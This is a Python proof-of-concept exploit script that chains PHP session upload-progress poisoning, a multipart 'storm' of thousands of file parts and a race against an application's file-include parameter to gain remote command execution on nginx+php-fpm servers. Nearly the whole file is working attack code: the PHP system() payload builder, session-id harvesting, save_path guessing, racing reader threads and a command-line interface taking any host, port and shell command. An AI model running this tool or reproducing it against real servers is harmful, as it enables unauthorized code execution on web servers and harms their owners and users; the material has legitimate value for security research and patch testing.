#!/usr/bin/env python3
"""Include-race RCE: upload-progress session poison + file-part storm + LFI param.

Ported from 0xdeadbeefnetwork/php2shell2shell's include-race chain. Through a
stock nginx+php-fpm (no raw-FCGI, no gadget class): (1) a multipart POST writes
raw PHP into the on-disk session file via the rfc1867 upload-progress hook;
(2) ~5000 one-byte file parts stretch the parse so the poisoned key lingers;
(3) reader threads race ``GET ?param=<save_path>/sess_<sid>`` through the app's
own include() into that window -> RCE as the fpm worker.

Corruption-free (vuln and patched php). Preconditions: one includable GET param
on a page that session_start()s; upload_progress on; known save_path; a
multi-worker pool; controllable sid (strict_mode off) or app-issued sid. -I safe.
"""

import argparse
import base64
import os
import re
import socket
import sys
import threading
import time
from urllib.parse import quote

_POC_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common.http_raw import recv_all as _recv_all, raw_request as http_raw  # noqa: E402
from common.multipart import storm_body as _storm_body  # noqa: E402

MARK_S, MARK_E = "P2Sir_s", "P2Sir_e"
BOUND = "----p2sincrace"

# stock-default save_path guesses; the lab uses /var/sess.
SAVE_PATHS = [
    "/var/sess", "/var/lib/php/sessions", "/var/lib/php", "/tmp",
    "/var/tmp", "/var/cpanel/php/sessions", "/opt/php/sessions",
]


def make_key(cmd):
    b64 = base64.b64encode(cmd.encode()).decode()
    # leading 'x' keeps the upload_progress_ prefix + text outside the PHP tag.
    return (f"x<?php echo '{MARK_S}';"
            f"system(base64_decode('{b64}'));"
            f"echo '{MARK_E}';?>")


def build_storm_body(key, parts=5000):
    """PHP_SESSION_UPLOAD_PROGRESS poison field + `parts` one-byte file parts."""
    return _storm_body(key, parts, BOUND)




def get_sid(host, port, base, timeout=10):
    raw = (f"GET {base} HTTP/1.1\r\nHost: {host}\r\n"
           f"Connection: close\r\n\r\n").encode()
    d = http_raw(host, port, raw, timeout)
    m = re.search(rb"PHPSESSID=([0-9A-Za-z,-]+)", d)
    return m.group(1).decode() if m else None


def extract(data):
    m = re.search(MARK_S.encode() + rb"(.*?)" + MARK_E.encode(), data, re.S)
    return m.group(1).decode(errors="replace") if m else None


def run(host, port, cmd, base="/index.php", param="page", save_paths=None,
        sid=None, parts=5000, attempts=25, readers=4, verbose=True):
    """Full poison->stretch->read race. Returns (ok, output, hit_path)."""
    save_paths = save_paths or SAVE_PATHS

    def log(m):
        if verbose:
            print(m, flush=True)

    if not sid:
        sid = get_sid(host, port, base)
        if not sid:
            log("[-] no PHPSESSID from the app (does the page session_start()?). "
                "Pass --sid for strict_mode=Off targets.")
            return False, None, None
    log(f"[*] target http://{host}:{port}{base}  param={param}  sid={sid}")
    cookie = f"PHPSESSID={sid}"
    sess_files = [f"{sp.rstrip('/')}/sess_{sid}" for sp in save_paths]
    log(f"[*] {len(sess_files)} save_path guesses x {readers} readers, "
        f"{parts}-part storm, up to {attempts} rounds")

    key = make_key(cmd)
    storm = build_storm_body(key, parts=parts)
    storm_hdr = (f"POST {base} HTTP/1.1\r\nHost: {host}\r\n"
                 f"Content-Type: multipart/form-data; boundary={BOUND}\r\n"
                 f"Content-Length: {len(storm)}\r\nCookie: {cookie}\r\n"
                 f"Connection: close\r\n\r\n").encode()
    read_reqs = [
        (f"GET {base}?{param}=" + quote(sf) + f" HTTP/1.1\r\nHost: {host}\r\n"
         f"Cookie: {cookie}\r\nConnection: close\r\n\r\n").encode()
        for sf in sess_files
    ]

    result = {}
    stop = threading.Event()

    def reader():
        while not stop.is_set():
            for idx, rq in enumerate(read_reqs):
                if stop.is_set():
                    return
                try:
                    d = http_raw(host, port, rq, timeout=8)
                except OSError:
                    continue
                out = extract(d)
                if out is not None or MARK_S.encode() in d:
                    result["ok"] = True
                    result["out"] = out or ""
                    result["hit"] = sess_files[idx]
                    stop.set()
                    return

    for n in range(1, attempts + 1):
        stop.clear()
        pool = [threading.Thread(target=reader, daemon=True) for _ in range(readers)]
        for t in pool:
            t.start()
        try:
            with socket.create_connection((host, port), timeout=20) as s:
                s.sendall(storm_hdr + storm)
                _recv_all(s, 15)
        except OSError:
            pass
        time.sleep(0.3)
        stop.set()
        for t in pool:
            t.join(timeout=3)
        if result.get("ok"):
            log(f"[+] LANDED via include {result['hit']} (round {n})")
            if result.get("out"):
                log(result["out"].rstrip())
            return True, result.get("out"), result.get("hit")
        if verbose and n % 5 == 0:
            log(f"    round {n}: no marker yet")

    # final blind sweep (in case the window happened to be open after the storm)
    for idx, rq in enumerate(read_reqs):
        try:
            d = http_raw(host, port, rq, timeout=6)
        except OSError:
            continue
        out = extract(d)
        if out is not None or MARK_S.encode() in d:
            log(f"[+] LANDED via include {sess_files[idx]} (final sweep)")
            if out:
                log(out.rstrip())
            return True, out, sess_files[idx]

    log("[-] no markers. check: includable param, save_path, upload_progress.enabled, "
        ">=2 workers, client_max_body_size >= storm size")
    return False, None, None


def _cli(argv):
    ap = argparse.ArgumentParser(
        description=__doc__.splitlines()[0],
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("host", help="webserver host (e.g. 127.0.0.1)")
    ap.add_argument("port", type=int, help="webserver port (e.g. 80)")
    ap.add_argument("--cmd", default="id", help="shell command (default: id)")
    ap.add_argument("--base", default="/index.php", help="app page (default: /index.php)")
    ap.add_argument("--param", default="page", help="includable GET param (default: page)")
    ap.add_argument("--save-path", action="append",
                    help="session save_path (repeatable; default: common guesses)")
    ap.add_argument("--sid", help="session id (default: taken from the app cookie)")
    ap.add_argument("--parts", type=int, default=5000, help="storm file parts")
    ap.add_argument("--attempts", type=int, default=25)
    ap.add_argument("--readers", type=int, default=4)
    args = ap.parse_args(argv)
    ok, _o, _h = run(args.host, args.port, args.cmd, base=args.base,
                     param=args.param, save_paths=args.save_path, sid=args.sid,
                     parts=args.parts, attempts=args.attempts, readers=args.readers)
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(_cli(sys.argv[1:]))
